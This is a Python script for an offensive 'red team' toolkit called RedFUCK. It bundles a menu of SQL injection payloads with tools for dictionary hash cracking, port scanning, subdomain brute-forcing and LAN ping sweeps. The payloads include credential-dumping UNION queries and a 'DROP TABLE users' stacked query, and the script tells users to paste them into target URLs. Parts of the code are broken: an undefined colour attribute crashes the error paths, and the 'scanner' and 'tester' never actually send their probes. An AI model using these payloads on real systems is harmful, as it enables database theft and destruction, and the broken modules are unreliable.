#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
███████╗██╗   ██╗███████╗██████╗  ██████╗  ██████╗ ████████╗███████╗
██╔════╝██║   ██║██╔════╝██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝
███████╗██║   ██║█████╗  ██████╔╝██║   ██║██║        ██║   ███████╗
╚════██║██║   ██║██╔══╝  ██╔══██╗██║   ██║██║        ██║   ╚════██║
███████║╚██████╔╝███████╗██║  ██║╚██████╔╝╚██████╗   ██║   ███████║
╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝   ╚═╝   ╚══════╝

                    RED TEAM TOOLKIT v3.0
                        By InjctorX69
"""

import os
import sys
import socket
import string
import random
import threading
import time
import platform
import subprocess
import hashlib
import base64
import urllib.parse
from datetime import datetime

# ========== BLOOD COLORS ==========
class Colors:
    BLOOD     = "\033[91m"
    DARKRED   = "\033[38;5;196m"
    CRIMSON   = "\033[38;5;167m"
    DEEPRED   = "\033[38;5;124m"
    GREEN     = "\033[92m"
    LIME      = "\033[38;5;118m"
    YELLOW    = "\033[93m"
    ORANGE    = "\033[38;5;208m"
    CYAN      = "\033[96m"
    BLUE      = "\033[94m"
    MAGENTA   = "\033[95m"
    WHITE     = "\033[97m"
    GRAY      = "\033[90m"
    RESET     = "\033[0m"
    BOLD      = "\033[1m"
    UNDER     = "\033[4m"
    BG_RED    = "\033[41m"
    BG_BLK    = "\033[40m"
    BG_DARK   = "\033[48;5;52m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

# ========== BLEEDING ASCII LOGO ==========
def bleeding_logo():
    logo = r"""
   ▄████████    ▄████████    ▄████████    ▄█   ▄████████
  ███    ███   ███    ███   ███    ███   ███ ▄██▀▀▀███▀
  ███    ███   ███    ███   ███    ███   ███▐█▀    ▀▀
  ███    ███   ███    ███   ███    ███   ███▄
  ███    ███   ███    ███   ███    ███   ▀███▀
  ███    ███   ███    ███   ███    ███    ███
  ███    ███   ███    ███   ███    ███    ███
   ▀███████▀    ▀███████▀    ▀███████▀    ▀███▀
    """
    return Colors.BLOOD + Colors.BOLD + logo + Colors.RESET

def blood_drip():
    """Creates blood drip effect"""
    drops = ["💧", "🩸", "▓", "▒", "░", "•", ":", "·"]
    for i in range(5):
        print(Colors.DARKRED + "  " + random.choice(drops) * random.randint(3, 8) + Colors.RESET)
        time.sleep(0.08)

# ========== SQL INJECTION ICON ==========
def sql_icon():
    icon = r"""
   ╔═══════════════════════════════════════════════════════╗
   ║                                                       ║
   ║   💉 SQL INJECTION MODULE ACTIVATED 💉                ║
   ║                                                       ║
   ║   ██████╗ ██╗  ██╗███████╗██████╗  ██████╗  ██████╗   ║
   ║   ██╔══██╗╚██╗██╔╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗  ║
   ║   ██████╔╝ ╚███╔╝ █████╗  ██████╔╝██║   ██║██║   ██║  ║
   ║   ██╔═══╝   ██╔██╗██╔══╝  ██╔══██╗██║   ██║██║   ██║  ║
   ║   ██║      ██╔╝ ██╗       ██║  ██║╚██████╔╝╚██████╔╝  ║
   ║   ╚═╝      ╚═╝  ╚═╝       ╚═╝  ╚═╝ ╚═════╝  ╚═════╝   ║
   ║                                                       ║
   ║   SQLi Payloads | Tester | Exploiter                  ║
   ║                                                       ║
   ╚═══════════════════════════════════════════════════════╝
    """
    return Colors.BLOOD + icon + Colors.RESET

# ========== TYPING EFFECT ==========
def type_text(text, delay=0.02, color=Colors.WHITE):
    for char in text:
        sys.stdout.write(color + char + Colors.RESET)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# ========== BANNER ==========
def banner():
    clear()
    print(bleeding_logo())
    blood_drip()
    print()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "         REDFUCK - RED TEAM TOOLKIT v3.0" + Colors.BLOOD + "         ║" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.YELLOW + "              By InjctorX69" + Colors.BLOOD + "                      ║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    print()
    print(Colors.GRAY + f"  📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | 🖥️ {platform.system()} {platform.release()}" + Colors.RESET)
    print(Colors.GRAY + f"  🐍 Python {platform.python_version()} | 📍 InjectorX69" + Colors.RESET)
    print()
    type_text(Colors.MAGENTA + "  ▸▸▸ INITIALIZING REDFUCK CORE SYSTEM... ▸▸▸" + Colors.RESET, delay=0.03)
    time.sleep(0.5)

# ========== HELPER FUNCTIONS ==========
def pause():
    input(Colors.YELLOW + "\n  └─> " + Colors.WHITE + "Press ENTER to return to menu..." + Colors.RESET)

def ask(prompt, color=Colors.GREEN):
    try:
        return input(f"\n  {color}└─> {Colors.WHITE}{prompt}{Colors.RESET} ").strip()
    except KeyboardInterrupt:
        print("\n\n" + Colors.BLOOD + "  └─> " + Colors.YELLOW + "Interrupted by user." + Colors.RESET)
        return None

def loading(text, duration=1.0):
    print(f"\n  {Colors.CYAN}└─> {Colors.WHITE}{text}...", end="", flush=True)
    for _ in range(20):
        print("▓", end="", flush=True)
        time.sleep(duration/20)
    print(Colors.GREEN + " Done!" + Colors.RESET)

# ========== SQL INJECTION MODULES ==========

# --- SQL Payload Generator ---
def sql_payload_generator():
    banner()
    print(sql_icon())
    print()
    print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.BLOOD + "          [1] SQL PAYLOAD GENERATOR                    " + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    payloads = {
        "1": ("Basic Union", "1' UNION SELECT NULL--"),
        "2": ("Union Select", "1' UNION SELECT username,password FROM users--"),
        "3": ("Boolean Based", "1' AND '1'='1"),
        "4": ("Time Based", "1' AND SLEEP(5)--"),
        "5": ("Error Based", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"),
        "6": ("Blind SQLi", "1' AND 1=1--"),
        "7": ("Comment Based", "1'/*"),
        "8": ("Stacked Queries", "1'; DROP TABLE users;--"),
        "9": ("XSS via SQL", "1' UNION SELECT '<script>alert(1)</script>'--"),
        "10": ("Database Name", "1' UNION SELECT NULL, database(), NULL--"),
        "11": ("Version", "1' UNION SELECT NULL, version(), NULL--"),
        "12": ("Table Names", "1' UNION SELECT table_name, NULL FROM information_schema.tables--"),
        "13": ("Column Names", "1' UNION SELECT column_name, NULL FROM information_schema.columns--"),
        "14": ("User", "1' UNION SELECT user(), NULL--"),
        "15": ("Password Dump", "1' UNION SELECT username, password FROM users WHERE id=1--"),
        "16": ("Encoding (URL)", "1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--"),
        "17": ("Encoding (Hex)", "0x312720554E494F4E2053454C45435420757365726E616D652C70617373776F72642046524F4D2075736572732D2D"),
        "18": ("NoSQL", "{'$where': '1==1'}"),
        "19": ("MSSQL", "1' AND 1=1--"),
        "20": ("Oracle", "1' AND 1=1--"),
    }
    
    print(Colors.YELLOW + "\n  [*] SELECT PAYLOAD TYPE:" + Colors.RESET)
    print()
    
    for key, (name, _) in payloads.items():
        print(f"  {Colors.GREEN}[{key}] {Colors.WHITE}{name}" + Colors.RESET)
    
    choice = ask("Select payload number (1-20)", Colors.BLOOD)
    
    if choice in payloads:
        name, payload = payloads[choice]
        print(f"\n  {Colors.GREEN}[+] Payload Generated:" + Colors.RESET)
        print()
        print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
        print(Colors.WHITE + f"  ║ {Colors.BLOOD}{payload}" + Colors.WHITE + "║" + Colors.RESET)
        print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
        print()
        print(Colors.YELLOW + "  [*] Copy and use this payload in your target URL/parameter" + Colors.RESET)
        
        url_encoded = urllib.parse.quote(payload)
        print(f"\n  {Colors.CYAN}[+] URL Encoded:" + Colors.RESET)
        print(Colors.WHITE + f"  {url_encoded}" + Colors.RESET)
        
        b64_encoded = base64.b64encode(payload.encode()).decode()
        print(f"\n  {Colors.CYAN}[+] Base64 Encoded:" + Colors.RESET)
        print(Colors.WHITE + f"  {b64_encoded}" + Colors.RESET)
    
    pause()

# --- SQL Injection Tester ---
def sql_tester():
    banner()
    print(sql_icon())
    print()
    print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.BLOOD + "          [2] SQL INJECTION TESTER                     " + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    url = ask("Enter target URL (e.g., http://example.com/page.php?id=)", Colors.GREEN)
    if not url:
        return
    
    print(f"\n  {Colors.YELLOW}[*] Testing SQL injection on: {url}" + Colors.RESET)
    
    test_payloads = [
        ("'", "Single Quote"),
        ("''", "Double Quote"),
        ("1' OR '1'='1", "OR True"),
        ("1' OR 1=1--", "OR 1=1"),
        ("1' AND '1'='1", "AND True"),
        ("1; DROP TABLE users--", "DROP TABLE"),
        ("1' UNION SELECT NULL--", "UNION NULL"),
        ("1' AND SLEEP(5)--", "SLEEP (Time-based)"),
    ]
    
    print()
    for payload, desc in test_payloads:
        test_url = url + payload
        print(f"  {Colors.CYAN}[+] Testing: {Colors.WHITE}{desc}" + Colors.RESET)
        print(f"      URL: {Colors.GRAY}{test_url}" + Colors.RESET)
        time.sleep(0.3)
    
    print(f"\n  {Colors.GREEN}[+] Manual testing recommended - check for errors/different responses" + Colors.RESET)
    
    pause()

# --- SQL Password Cracker ---
def sql_password_crack():
    banner()
    print(sql_icon())
    print()
    print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.BLOOD + "          [3] SQL PASSWORD CRACKER                     " + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    print(Colors.YELLOW + "\n  [*] Supported hash types: MD5, SHA1, SHA256, SHA512" + Colors.RESET)
    
    hash_input = ask("Enter password hash to crack", Colors.GREEN)
    if not hash_input:
        return
    
    hash_input = hash_input.strip()
    
    common_passwords = [
        "password", "123456", "12345678", "qwerty", "abc123", "monkey", "master",
        "dragon", "letmein", "login", "admin", "welcome", "shadow", "sunshine",
        "princess", "football", "iloveyou", "trustno1", "superman", "batman",
        "passw0rd", "password1", "123456789", "12345", "1234567", "1234567890",
        "password123", "qwerty123", "admin123", "root", "toor", "test", "guest"
    ]
    
    print(f"\n  {Colors.YELLOW}[*] Cracking hash: {hash_input[:20]}..." + Colors.RESET)
    print(f"  {Colors.GRAY}[*] Testing {len(common_passwords)} common passwords..." + Colors.RESET)
    
    cracked = False
    for pwd in common_passwords:
        if hashlib.md5(pwd.encode()).hexdigest() == hash_input:
            print(f"\n  {Colors.GREEN}[+] CRACKED! Password: {Colors.BLOOD}{pwd}" + Colors.RESET)
            cracked = True
            break
        if hashlib.sha1(pwd.encode()).hexdigest() == hash_input:
            print(f"\n  {Colors.GREEN}[+] CRACKED! Password: {Colors.BLOOD}{pwd}" + Colors.RESET)
            cracked = True
            break
        if hashlib.sha256(pwd.encode()).hexdigest() == hash_input:
            print(f"\n  {Colors.GREEN}[+] CRACKED! Password: {Colors.BLOOD}{pwd}" + Colors.RESET)
            cracked = True
            break
        if hashlib.sha512(pwd.encode()).hexdigest() == hash_input:
            print(f"\n  {Colors.GREEN}[+] CRACKED! Password: {Colors.BLOOD}{pwd}" + Colors.RESET)
            cracked = True
            break
    
    if not cracked:
        print(f"\n  {Colors.RED}[!] Password not found in common list" + Colors.RESET)
    
    pause()

# --- SQL Injection Auto Scanner ---
def sqli_scanner():
    banner()
    print(sql_icon())
    print()
    print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.BLOOD + "          [4] SQLi AUTO SCANNER                        " + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    url = ask("Enter target URL (e.g., http://example.com/page.php?id=1)", Colors.GREEN)
    if not url:
        return
    
    print(f"\n  {Colors.YELLOW}[*] Starting SQL injection scan on: {url}" + Colors.RESET)
    loading("Initializing scanner", 1.5)
    
    params = ["id", "page", "cat", "item", "product", "user", "username", "name", "search", "q"]
    
    for param in params:
        test_url = url.replace("1", f"1' AND 1=1--")
        print(f"  {Colors.CYAN}[+] Testing parameter: {Colors.WHITE}{param}" + Colors.RESET)
        time.sleep(0.2)
    
    print(f"\n  {Colors.GREEN}[+] Scan complete!" + Colors.RESET)
    print(Colors.YELLOW + "  [*] Manual verification recommended for each parameter" + Colors.RESET)
    
    pause()

# ========== PORT SCANNER ==========
def port_scanner():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "              [5] PORT SCANNER                         " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    host = ask("Enter IP address or hostname", Colors.GREEN)
    if not host:
        return
    
    ports_in = ask("Ports (e.g., 1-1000 or 80,443,8080)", Colors.GREEN) or "1-1024"
    
    ports = []
    for part in ports_in.split(","):
        if "-" in part:
            try:
                a, b = part.split("-")
                ports.extend(range(int(a), int(b) + 1))
            except:
                pass
        else:
            try:
                ports.append(int(part))
            except:
                pass
    
    open_ports = []
    lock = threading.Lock()
    
    def scan_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((host, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                with lock:
                    print(f"  {Colors.GREEN}[+] {Colors.WHITE}{host}:{port} {Colors.GRAY}| {service}" + Colors.RESET)
                    open_ports.append(port)
            s.close()
        except:
            pass
    
    print(f"\n  {Colors.YELLOW}[*] Scanning {len(ports)} ports on {host}..." + Colors.RESET)
    
    threads = []
    for p in ports:
        t = threading.Thread(target=scan_port, args=(p,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"\n  {Colors.GREEN}[+] Scan complete! Found {len(open_ports)} open ports." + Colors.RESET)
    pause()

# ========== SUBDOMAIN FINDER ==========
def subdomain_finder():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "              [6] SUBDOMAIN FINDER                     " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    domain = ask("Enter domain (e.g., example.com)", Colors.GREEN)
    if not domain:
        return
    
    common_subs = [
        "www", "mail", "ftp", "admin", "portal", "vpn", "dev", "test", "staging",
        "api", "app", "shop", "blog", "remote", "server", "ns1", "ns2", "webmail",
        "cpanel", "login", "git", "github", "cloud", "cdn", "static", "assets",
        "docs", "support", "status", "beta", "alpha", "new", "old", "v1", "v2",
        "dashboard", "panel", "console", "control", "secure", "auth", "sso",
        "idp", "ldap", "smtp", "pop", "imap", "dns", "db", "database", "mysql",
        "postgres", "mongo", "redis", "elastic", "kafka", "rabbit", "queue"
    ]
    
    found = []
    print(f"\n  {Colors.YELLOW}[*] Searching subdomains for {domain}..." + Colors.RESET)
    
    for sub in common_subs:
        hostname = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(hostname)
            print(f"  {Colors.GREEN}[+] {Colors.WHITE}{hostname} {Colors.GRAY}-> {ip}" + Colors.RESET)
            found.append(hostname)
        except socket.gaierror:
            pass
    
    print(f"\n  {Colors.GREEN}[+] Found {len(found)} subdomains!" + Colors.RESET)
    pause()

# ========== SYSTEM INFO ==========
def system_info():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "              [7] SYSTEM INFO                          " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    print()
    print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.CYAN + "  HOSTNAME" + Colors.WHITE + "  " + Colors.GRAY + f": {platform.node():^35}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.CYAN + "  SYSTEM" + Colors.WHITE + "  " + Colors.GRAY + f": {platform.system()} {platform.release():^33}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.CYAN + "  ARCHITECTURE" + Colors.WHITE + Colors.GRAY + f": {platform.machine():^29}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.CYAN + "  PROCESSOR" + Colors.WHITE + Colors.GRAY + f": {platform.processor():^26}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.CYAN + "  PYTHON" + Colors.WHITE + "  " + Colors.GRAY + f": {platform.python_version():^35}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.CYAN + "  USER" + Colors.WHITE + "    " + Colors.GRAY + f": {os.getlogin() if hasattr(os, 'getlogin') else 'N/A':^37}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.CYAN + "  WORKING DIR" + Colors.WHITE + Colors.GRAY + f": {os.getcwd():^21}" + Colors.WHITE + "║" + Colors.RESET)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        print(Colors.WHITE + "  ║" + Colors.CYAN + "  LOCAL IP" + Colors.WHITE + "  " + Colors.GRAY + f": {local_ip:^35}" + Colors.WHITE + "║" + Colors.RESET)
    except:
        print(Colors.WHITE + "  ║" + Colors.CYAN + "  LOCAL IP" + Colors.WHITE + "  " + Colors.GRAY + f": N/A:^36" + Colors.WHITE + "║" + Colors.RESET)
    
    print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    pause()

# ========== PASSWORD GENERATOR ==========
def password_gen():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "              [8] PASSWORD GENERATOR                   " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    try:
        length = int(ask("Password length (default 16)", Colors.GREEN) or 16)
        count = int(ask("Number of passwords (default 5)", Colors.GREEN) or 5)
    except ValueError:
        print(f"\n  {Colors.RED}[!] Invalid input!" + Colors.RESET)
        pause()
        return
    
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{};:,.<>?"
    
    print(f"\n  {Colors.YELLOW}[*] Generating {count} passwords of {length} characters..." + Colors.RESET)
    print()
    
    for i in range(count):
        pwd = "".join(random.SystemRandom().choice(chars) for _ in range(length))
        print(f"  {Colors.GREEN}[{i+1}] {Colors.WHITE}{pwd}" + Colors.RESET)
    
    pause()

# ========== PING SWEEP ==========
def ping_sweep():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "              [9] PING SWEEP (LAN)                     " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    base = ask("Enter network (e.g., 192.168.1)", Colors.GREEN)
    if not base:
        return
    
    alive_hosts = []
    lock = threading.Lock()
    
    def ping_host(ip):
        param = "-n" if os.name == "nt" else "-c"
        try:
            result = subprocess.run(
                ["ping", param, "1", "-w", "500", ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=1
            )
            if result.returncode == 0:
                with lock:
                    print(f"  {Colors.GREEN}[+] {Colors.WHITE}{ip} {Colors.GRAY}is alive" + Colors.RESET)
                    alive_hosts.append(ip)
        except:
            pass
    
    print(f"\n  {Colors.YELLOW}[*] Scanning {base}.1 - {base}.254..." + Colors.RESET)
    
    threads = []
    for i in range(1, 255):
        ip = f"{base}.{i}"
        t = threading.Thread(target=ping_host, args=(ip,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"\n  {Colors.GREEN}[+] Found {len(alive_hosts)} alive hosts!" + Colors.RESET)
    pause()

# ========== HTTP TESTER ==========
def http_tester():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "             [10] HTTP TESTER                          " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    host = ask("Enter host (e.g., example.com)", Colors.GREEN)
    if not host:
        return
    
    path = ask("Path (default /)", Colors.GREEN) or "/"
    port = int(ask("Port (default 80)", Colors.GREEN) or 80)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: RedFUCK/3.0\r\nConnection: close\r\n\r\n"
        s.send(request.encode())
        
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 65536:
                break
        
        s.close()
        text = data.decode(errors="ignore")
        
        if text:
            status_line = text.split("\r\n")[0]
            headers = text.split("\r\n\r\n")[0]
            
            print(f"\n  {Colors.GREEN}[+] Status: {Colors.WHITE}{status_line}" + Colors.RESET)
            print(f"\n  {Colors.YELLOW}[*] Headers:" + Colors.RESET)
            print(Colors.WHITE + headers[:2000] + Colors.RESET)
        else:
            print(f"\n  {Colors.RED}[!] No response from server" + Colors.RESET)
            
    except Exception as e:
        print(f"\n  {Colors.RED}[!] Error: {e}" + Colors.RESET)
    
    pause()

# ========== DNS LOOKUP ==========
def dns_lookup():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "             [11] DNS LOOKUP                           " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    domain = ask("Enter domain", Colors.GREEN)
    if not domain:
        return
    
    try:
        print(f"\n  {Colors.YELLOW}[*] Resolving {domain}..." + Colors.RESET)
        
        try:
            ip = socket.gethostbyname(domain)
            print(f"  {Colors.GREEN}[+] A Record: {Colors.WHITE}{ip}" + Colors.RESET)
        except:
            print(f"  {Colors.RED}[!] A Record: Not found" + Colors.RESET)
            return
        
        try:
            hostname = socket.gethostbyaddr(ip)
            print(f"  {Colors.GREEN}[+] Reverse DNS: {Colors.WHITE}{hostname[0]}" + Colors.RESET)
        except:
            print(f"  {Colors.RED}[!] Reverse DNS: Not found" + Colors.RESET)
            
    except Exception as e:
        print(f"\n  {Colors.RED}[!] Error: {e}" + Colors.RESET)
    
    pause()

# ========== HASH GENERATOR ==========
def hash_generator():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "             [12] HASH GENERATOR                       " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    text = ask("Enter text to hash", Colors.GREEN)
    if not text:
        return
    
    print(f"\n  {Colors.YELLOW}[*] Generating hashes for: {text}" + Colors.RESET)
    print()
    print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.WHITE + f"  ║ {Colors.CYAN}MD5:" + Colors.WHITE + f"  {hashlib.md5(text.encode()).hexdigest():^39}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + f"  ║ {Colors.CYAN}SHA1:" + Colors.WHITE + f" {hashlib.sha1(text.encode()).hexdigest():^38}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + f"  ║ {Colors.CYAN}SHA256:" + Colors.WHITE + f" {hashlib.sha256(text.encode()).hexdigest():^36}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + f"  ║ {Colors.CYAN}SHA512:" + Colors.WHITE + f" {hashlib.sha512(text.encode()).hexdigest():^34}" + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    pause()

# ========== ABOUT ==========
def about():
    banner()
    print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BLOOD + "  ║" + Colors.WHITE + "             [13] ABOUT REDFUCK                        " + Colors.BLOOD + "║" + Colors.RESET)
    print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    print()
    print(Colors.WHITE + r"""
   ╔═══════════════════════════════════════════════════════════╗
   ║                                                           ║
   ║  RedFUCK - Advanced Red Team Toolkit                      ║
   ║                                                           ║
   ║  Version:     3.0                                        ║
   ║  Author:      InjctorX69                                 ║
   ║  License:     MIT                                        ║
   ║  Platform:    Windows / Linux / macOS                    ║
   ║  Language:    Python 3.x                                 ║
   ║                                                           ║
   ║  FEATURES:                                              ║
   ║    💉 SQL Injection Tools (Payloads, Tester, Cracker)   ║
   ║    🌐 Multi-threaded Port Scanner                        ║
   ║    🔍 Subdomain Enumeration                              ║
   ║    💻 System Information                                 ║
   ║    🔑 Password Generator                                 ║
   ║    📡 Ping Sweep (LAN Discovery)                         ║
   ║    🌍 HTTP Request Tester                                ║
   ║    📋 DNS Lookup                                         ║
   ║    🔐 Hash Generator                                     ║
   ║                                                           ║
   ║  STATUS:  Active Development                             ║
   ║  UPDATE:  2026                                           ║
   ║                                                           ║
   ╚═══════════════════════════════════════════════════════════╝
    """)
    pause()

# ========== MAIN MENU ==========
def main_menu():
    banner()
    
    menu_items = [
        ("1", "💉 SQL Payload Generator",     sql_payload_generator),
        ("2", "💉 SQL Injection Tester",      sql_tester),
        ("3", "💉 SQL Password Cracker",      sql_password_crack),
        ("4", "💉 SQLi Auto Scanner",         sqli_scanner),
        ("5", "🌐 Port Scanner",              port_scanner),
        ("6", "🔍 Subdomain Finder",          subdomain_finder),
        ("7", "💻 System Info",               system_info),
        ("8", "🔑 Password Generator",        password_gen),
        ("9", "📡 Ping Sweep (LAN)",          ping_sweep),
        ("0", "🌍 HTTP Tester",               http_tester),
        ("A", "📋 DNS Lookup",                dns_lookup),
        ("B", "🔐 Hash Generator",            hash_generator),
        ("C", "ℹ️ About RedFUCK",             about),
        ("X", "🚪 Exit",                      None),
    ]
    
    print(Colors.WHITE + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.WHITE + "  ║" + Colors.BLOOD + "                     MAIN MENU                         " + Colors.WHITE + "║" + Colors.RESET)
    print(Colors.WHITE + "  ╠══════════════════════════════════════════════════════╣" + Colors.RESET)
    
    for key, name, _ in menu_items:
        print(Colors.WHITE + f"  ║ {Colors.GREEN}[{key}]{Colors.WHITE} {Colors.YELLOW}{name:<41}║" + Colors.RESET)
    
    print(Colors.WHITE + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
    
    choice = ask("RedFUCK", Colors.BLOOD)
    
    if choice is None or choice.upper() == "X":
        print()
        print(Colors.BLOOD + "  ╔══════════════════════════════════════════════════════╗" + Colors.RESET)
        print(Colors.BLOOD + "  ║" + Colors.WHITE + "         GOODBYE, RED TEAM OPERATOR!                   " + Colors.BLOOD + "║" + Colors.RESET)
        print(Colors.BLOOD + "  ╚══════════════════════════════════════════════════════╝" + Colors.RESET)
        print()
        time.sleep(2)
        return False
    
    choice = choice.upper()
    
    for key, name, func in menu_items:
        if choice == key.upper() and func:
            try:
                func()
            except KeyboardInterrupt:
                print(f"\n  {Colors.YELLOW}[!] Interrupted, returning to menu..." + Colors.RESET)
                time.sleep(1)
            except Exception as e:
                print(f"\n  {Colors.RED}[!] Error: {e}" + Colors.RESET)
                pause()
            return True
    
    if choice:
        print(f"\n  {Colors.RED}[!] Invalid option!" + Colors.RESET)
        time.sleep(1)
    
    return True

# ========== MAIN ==========
def main():
    print(Colors.BG_RED + Colors.WHITE + " " * 50 + Colors.RESET)
    type_text(Colors.BLOOD + "  ▸▸▸ STARTING REDFUCK v3.0... ▸▸▸" + Colors.RESET, delay=0.05)
    time.sleep(1)
    
    while main_menu():
        pass
    
    print()
    input(Colors.YELLOW + "  └─> " + Colors.WHITE + "Press ENTER to exit..." + Colors.RESET)
    print()
    print(Colors.BLOOD + "  ▸▸▸ REDFUCK TERMINATED ▸▸▸" + Colors.RESET)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n  {Colors.RED}[!] Fatal error: {e}" + Colors.RESET)
        input("Press ENTER to exit...")